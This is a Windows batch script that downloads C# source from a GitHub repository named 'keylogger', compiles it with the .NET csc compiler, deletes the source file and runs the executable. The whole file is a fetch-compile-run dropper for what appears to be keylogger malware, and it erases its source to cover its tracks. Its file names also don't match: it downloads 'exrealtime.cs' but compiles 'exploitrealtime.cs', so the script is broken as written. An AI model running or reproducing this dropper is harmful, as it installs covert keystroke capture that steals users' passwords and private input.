@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/exrealtime.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exploitrealtime.cs
erase exploitrealtime.cs & exploitrealtime.exe
